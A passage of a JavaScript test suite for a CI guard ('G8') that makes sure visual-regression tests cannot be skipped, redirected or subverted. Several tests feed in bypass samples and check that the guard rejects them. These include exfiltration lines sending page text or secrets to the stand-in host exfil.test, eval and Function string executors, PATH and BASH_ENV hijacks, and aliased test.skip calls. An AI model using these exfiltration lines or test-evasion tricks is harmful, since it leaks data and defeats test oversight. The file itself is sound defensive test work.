    result.output,
    /ci-full\.yml must run pnpm test:visual exactly once in one unconditional/,
  );
});

test("G8 rejects a conditionally skipped visual job", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "    name: visual regression (G8)",
    "    if: false\n    name: visual regression (G8)",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a conditionally skipped visual test step", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "        run: pnpm test:visual",
    "        if: false\n        run: pnpm test:visual",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a visual test step whose failure can be ignored", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "        run: pnpm test:visual",
    "        continue-on-error: true\n        run: pnpm test:visual",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a visual step run from the web package directory", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "        run: pnpm test:visual",
    "        working-directory: apps/web\n        run: pnpm test:visual",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a later run key that replaces the visual command", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "        run: pnpm test:visual",
    "        run: pnpm test:visual\n        run: echo skipped",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects an earlier step that can replace pnpm on the visual job PATH", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "      - name: Check inventory scope and run screen and Storybook baselines",
    '      - name: Install a no-op pnpm\n        run: echo "/tmp/fake-pnpm" >> "$GITHUB_PATH"\n      - name: Check inventory scope and run screen and Storybook baselines',
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a later steps key that replaces the visual job steps", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "  performance:",
    "    steps:\n      - run: echo skipped\n\n  performance:",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects job defaults that redirect the visual step", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "    name: visual regression (G8)",
    "    defaults:\n      run:\n        working-directory: apps/web\n    name: visual regression (G8)",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects workflow defaults that redirect the visual step", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = `defaults:\n  run:\n    working-directory: apps/web\n${original}`;
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects workflow-wide Bash startup code that can replace pnpm", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    '  DO_NOT_TRACK: "1"',
    '  DO_NOT_TRACK: "1"\n  BASH_ENV: scripts/ci/bash-env.sh',
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a second root jobs mapping that can replace the visual job", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = `${original}\njobs:\n  skipped:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo skipped\n`;
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a quoted job condition that the workflow reader cannot classify", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "    name: visual regression (G8)",
    '    "if": false\n    name: visual regression (G8)',
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /unconditional, failure-propagating visual regression/,
  );
});

test("G8 rejects a padded active inventory row without a matching baseline", async () => {
  const inventory = `${INVENTORY}\n| Hidden active row |  \`/agent/notifications\`  | route | P1 | 🟡 |`;
  const result = await runVisualScope({
    routes: [...INVENTORY_ROUTES, "/agent/notifications"],
    inventory,
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /inventory route Hidden active row \(\/agent\/notifications\) has no G8 test\/baseline manifest entry/,
  );
});

test("G8 rejects malformed inventory rows rather than dropping them", async () => {
  const inventory = `${INVENTORY}\n| Hidden active row | \`/agent/inbox\` | route | P1 | 🟡`;
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    inventory,
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /screen inventory line .* malformed table row/);
});

test("G8 rejects an active inventory row missing its opening pipe", async () => {
  const inventory = `${INVENTORY}\nHidden active row | \`/agent/inbox\` | route | P1 | 🟡 |`;
  const result = await runVisualScope({
    routes: [...INVENTORY_ROUTES, "/agent/notifications"],
    inventory,
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /screen inventory line .* malformed table row/);
});

test("G8 rejects an inventory with no canonical screen table", async () => {
  const result = await runVisualScope({
    screens: [],
    inventory: "No screen inventory table is present.\n",
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /must contain at least one canonical Screen inventory table/,
  );
});

test("G8 rejects an inventory whose rows hide every route from the route parser", async () => {
  const inventory = INVENTORY.replaceAll("| route |", "| section |");
  const result = await runVisualScope({
    screens: [],
    inventory,
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /must contain at least one route-kind inventory row/,
  );
});

for (const [label, mutation] of [
  ["missing threshold", (source) => source.replace("threshold: 0, ", "")],
  [
    "nonzero threshold",
    (source) => source.replace("threshold: 0", "threshold: 0.01"),
  ],
  ["missing includeAA", (source) => source.replace("includeAA: true", "")],
  [
    "false includeAA",
    (source) => source.replace("includeAA: true", "includeAA: false"),
  ],
  [
    "comparator override",
    (source) =>
      source.replace(
        "{ fullPage: true, ",
        '{ comparator: "ssim-cie94", fullPage: true, ',
      ),
  ],
  [
    "pixel ratio tolerance",
    (source) =>
      source.replace(
        "{ fullPage: true, ",
        "{ maxDiffPixelRatio: 1, fullPage: true, ",
      ),
  ],
]) {
  test(`G8 rejects Storybook screenshot comparison option ${label}`, async () => {
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      storySource: mutation(storybookSpec()),
    });

    assert.notEqual(result.status, 0);
    assert.match(
      result.output,
      /Storybook visual test must load the exported-story index/,
    );
  });

  test(`G8 rejects route screenshot comparison option ${label}`, async () => {
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      source: mutation(visualSpec(SCREENS)),
    });

    assert.notEqual(result.status, 0);
    assert.match(
      result.output,
      /does not capture its declared screenshot baseline/,
    );
  });
}

test("G8 permits the canonical navigation, Storybook fetch, and read-only callbacks", async () => {
  const result = await runVisualScope({ routes: INVENTORY_ROUTES });

  assert.equal(result.status, 0, result.output);
  assert.match(result.output, /G8 scope check passed/);
});

test("G8 uses strict pixel matchers without comparing PNG encoding bytes", async () => {
  const result = await runVisualScope({ routes: INVENTORY_ROUTES });

  assert.equal(result.status, 0, result.output);
  assert.match(
    visualSpec(SCREENS),
    /maxDiffPixels: 0, threshold: 0, includeAA: true/,
  );
  assert.match(
    storybookSpec(),
    /maxDiffPixels: 0, threshold: 0, includeAA: true/,
  );
  assert.doesNotMatch(visualSpec(SCREENS), /Buffer|\.equals\(/);
  assert.doesNotMatch(storybookSpec(), /Buffer|\.equals\(/);
});

test("G8 rejects opaque browser execution and string-based code executors", async () => {
  const probes = [
    "void page.evaluate(\"fetch(\\'https://exfil.test/?x=\\'+document.documentElement.innerText)\" as any);",
    "setTimeout(\"fetch(\\'https://exfil.test/\\')\", 0);",
    "setInterval(`fetch(\\'https://exfil.test/\\')`, 1000);",
    "const defer = setTimeout; defer(\"fetch(\\'https://exfil.test/\\')\", 0);",
    "eval(\"fetch(\\'https://exfil.test/\\')\");",
    "new Function(\"fetch(\\'https://exfil.test/\\')\")();",
  ];

  for (const runtimeCode of probes) {
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      source: visualSpec(SCREENS, { runtimeCode }),
    });

    assert.notEqual(result.status, 0, runtimeCode);
    assert.match(result.output, /network capability/, runtimeCode);
  }
});

test("G8 rejects evaluateHandle through an allowed page locator alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      additionalVisualOperationFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /navigation|network capability/i);
});

test("G8 rejects evaluateAll through an allowed page locator alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      additionalVisualOperationFor: "work list @visual",
      additionalVisualOperationCode:
        'const root = page.locator("#storybook-root"); await root.evaluateAll((nodes) => nodes.length);',
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /network capability/i);
});

test("G8 rejects an extracted evaluateHandle method alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      additionalVisualOperationFor: "work list @visual",
      additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; const run = root.evaluateHandle; await run(source);`,
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /network capability/i);
});

test("G8 rejects a destructured evaluateHandle method alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      additionalVisualOperationFor: "work list @visual",
      additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; const { evaluateHandle: run } = root; await run(source);`,
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /network capability/i);
});

test("G8 rejects computed evaluateHandle access on a locator alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      additionalVisualOperationFor: "work list @visual",
      additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; await root["evaluateHandle"](source);`,
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /network capability/i);
});

test("G8 rejects string source passed to the approved Storybook page evaluation", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({
      pageEvaluateCallback:
        "\"fetch(\\'https://exfil.test/?x=\\'+document.documentElement.innerText)\" as any",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /canonical Storybook index/);
});

test("G8 rejects arbitrary fetch calls and request options in visual specs", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      runtimeCode:
        'void fetch("https://exfil.test/collect", { method: "POST", body: "secret" });',
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /network capability/);
});

test("G8 allows only the single canonical Storybook index fetch", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({
      runtimeCode:
        'void fetch("https://exfil.test/collect", { method: "POST", body: "secret" });',
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /canonical Storybook index/);
});

test("G8 rejects alternate network APIs in required visual specs", async () => {
  const probes = [
    'const xhr = new XMLHttpRequest(); xhr.open("POST", "https://exfil.test"); xhr.send("secret");',
    'navigator.sendBeacon("https://exfil.test", "secret");',
    'new WebSocket("wss://exfil.test");',
    'new EventSource("https://exfil.test");',
    'const transport = { fetch: (_url: string) => undefined }; transport.fetch("https://exfil.test");',
    'void page.request.post("https://exfil.test", { data: "secret" });',
    'void page["request"].post("https://exfil.test", { data: "secret" });',
    'const route = { request: () => ({ url: () => "https://exfil.test" }) }; route.request().url();',
    "let client: APIRequestContext;",
  ];

  for (const runtimeCode of probes) {
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      source: visualSpec(SCREENS, { runtimeCode }),
    });

    assert.notEqual(result.status, 0, runtimeCode);
    assert.match(result.output, /network capability/, runtimeCode);
  }
});

test("G8 rejects Storybook runtime mutation of array iteration or dynamic code execution", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({
      runtimeCode: [
        "Array.prototype[Symbol.iterator] = function* () {};",
        "Array.prototype.filter = () => [];",
        'const bypass = [].constructor.constructor("return true")();',
      ].join("\n"),
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /contains unsafe runtime code/);
});

test("G8 rejects aliased Playwright controls and callback defaults", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      runtimeCode: [
        "const skipVisual = test.skip;",
        "const { fixme: disableVisual } = test;",
        "const callback = (page = (process.exit(0), {})) => page;",
      ].join("\n"),
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /contains unsafe runtime code/);
});

test("G8 rejects assignment aliases and computed Playwright control calls", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({
      runtimeCode: "let testApi; testApi = test;",
      computedAliasSkip: true,
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /contains unsafe runtime code/);
});

test("G8 rejects Playwright references passed through mutation and computed APIs", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({
      runtimeCode: [
        'Object.defineProperty(Object, "t", { value: test });',
        'Object["t"]["con" + "figure"]({ mode: "skip" });',
      ].join("\n"),
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /contains unsafe runtime code/);
});

test("G8 rejects suite configuration and process exit before screenshots run", async () => {
  const configured = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({
      runtimeCode: "test.describe.configure({ mode: 'default' });",
    }),
  });
  assert.notEqual(configured.status, 0);
  assert.match(configured.output, /contains unsafe runtime code/);

  const exited = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ runtimeCode: "process.exit(0);" }),
  });
  assert.notEqual(exited.status, 0);
  assert.match(exited.output, /contains unsafe runtime code/);
});

test("G8 rejects untrusted loaders in screenshot specifications", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: `${visualSpec(SCREENS)}\nimport { readFileSync } from "node:fs";`,
  });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /contains unsafe runtime code/);
});

test("G8 rejects a no-op wrapper that shadows Playwright's test import", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { fakeTestBinding: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /must bind test and expect directly to @playwright\/test/,
  );
});

test("G8 rejects a computed test.skip call in a route visual test", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { computedSkipFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /cannot contain test\.skip, test\.fixme, test\.fail, or test\.only calls/,
  );
});

test("G8 rejects a visual callback that shadows its Playwright page fixture", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      shadowedPageBindingFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /must receive the Playwright page fixture directly/,
  );
});

test("G8 does not require a not-started inventory route to have a route or baseline", async () => {
  const result = await runVisualScope({
    screens: SCREENS.slice(0, 2),
    routes: INVENTORY_ROUTES,
  });

  assert.equal(result.status, 0, result.output);
});

test("G8 binds each declared screenshot to its own named test", async () => {
  const source = visualSpec(SCREENS, {
    omitScreenshotFor: "work list @visual",
  });
  assert.doesNotMatch(source, /work-list\.png/);
  assert.match(source, /toHaveScreenshot\("work-item-detail\.png"/);

  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source,
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list test does not capture its declared screenshot baseline/,
  );
});

test("G8 rejects a visual test that navigates to another application route", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { wrongRouteFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must have exactly one direct awaited literal navigation/,
  );
});

test("G8 binds each visual test to its declared application route and query state", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { wrongQueryFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /must have exactly one direct awaited literal navigation/,
  );
});

test("G8 rejects an additional nonliteral route navigation", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      additionalNavigationFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must have exactly one direct awaited literal navigation/,
  );
});

test("G8 rejects a nested conditional route navigation", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      nestedNavigationFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must have exactly one direct awaited literal navigation/,
  );
});

test("G8 rejects route navigation hidden in an external helper", async () => {
  const source = `async function navigateElsewhere(page) { await page.goto("/agent/inbox"); }\n${visualSpec(
    SCREENS,
    {
      helperNavigationFor: "work list @visual",
    },
  )}`;
  const result = await runVisualScope({ routes: INVENTORY_ROUTES, source });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /visual\.spec\.ts contains page navigation or screenshot assertions outside its named visual tests/,
  );
});

test("G8 requires the screenshot capture to follow its declared route navigation", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      screenshotBeforeNavigationFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test captures its screenshot before navigating to its declared route/,
  );
});

test("G8 rejects an early return that makes the screenshot unreachable", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { earlyReturnFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test can return before its route screenshot assertion/,
  );
});

test("G8 rejects replacing the declared route document before capture", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      setContentAfterNavigationFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 permits the authenticator password readiness interaction", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      enrollmentReadinessFor: "work list @visual",
    }),
  });

  assert.equal(result.status, 0, result.output);
});

test("G8 rejects enrollment readiness interactions outside the named password field", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      invalidEnrollmentReadinessFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 rejects a shadowed visual helper that can replace the page document", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      shadowedSettleHelperFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 rejects page document replacement hidden in a visible assertion argument", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      mutationInVisibilityFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 requires screen visual baselines to capture the whole page", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { locatorScreenshotFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list test does not capture its declared screenshot baseline/,
  );
});

test("G8 rejects viewport-only screenshots as the route baseline", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { viewportScreenshotFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list test does not capture its declared screenshot baseline/,
  );
});

test("G8 rejects a shadowed pre-navigation fixture helper", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      shadowedFixtureHelperFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 rejects route interception that can replace the application document", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      documentInterceptFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /visual\.spec\.ts contains page navigation or screenshot assertions outside its named visual tests, or intercepts a non-API document route/,
  );
});

test("G8 rejects DOM mutation inside an API fixture route handler", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      setContentInApiRouteFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 rejects computed tagged-template mutation through an aliased page fixture", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      computedTaggedSetContentInApiRouteFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test must use only API fixture setup before navigation/,
  );
});

test("G8 does not accept a nested screenshot helper as a route assertion", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      nestedScreenshotFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list test does not capture its declared screenshot baseline/,
  );
});

test("G8 rejects a visual route test that conditionally calls test.fixme", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, { disabledFor: "work list @visual" }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /work-list visual test cannot be skipped or fixme/,
  );
});

test("G8 fails when the Storybook test title remains but its coverage loop is removed", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ emptyCallback: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects a Storybook callback that conditionally calls test.skip", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ conditionalSkip: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test cannot be skipped or fixme/,
  );
});

test("G8 rejects a Storybook loop that continues before its screenshot in CI", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ skipStoryCaptureInCi: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects a Storybook story list mutation after its nonempty assertion", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateStoriesAfterAssertion: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects a Storybook list that freezes the array but leaves entries mutable", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ freezeStoryEntries: false }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects deletion from the fetched index before story enumeration", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ deleteIndexEntriesBeforeFreeze: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects edits to fetched story entries before story enumeration", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ rewriteIndexEntryBeforeFreeze: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects overwriting Object.values before story enumeration", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateObjectValues: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects overwriting Object.values through a local alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateObjectValuesByAlias: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects overwriting Object.values through an outer alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateObjectValuesByOuterAlias: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects Reflect.set overwriting Object.values", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateReflect: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects Reflect.set overwriting Object.values through an alias", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateReflectByAlias: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects eval that can replace the Storybook story iterator", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateWithEval: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects aliased eval that can replace the Storybook story iterator", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateWithEvalAlias: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects the Function constructor in Storybook coverage", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ mutateWithFunction: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 requires the fetched index and each exported entry to be frozen", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ freezeStoryIndex: false }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects a no-op wrapper that shadows the Storybook Playwright test import", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ fakeTestBinding: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
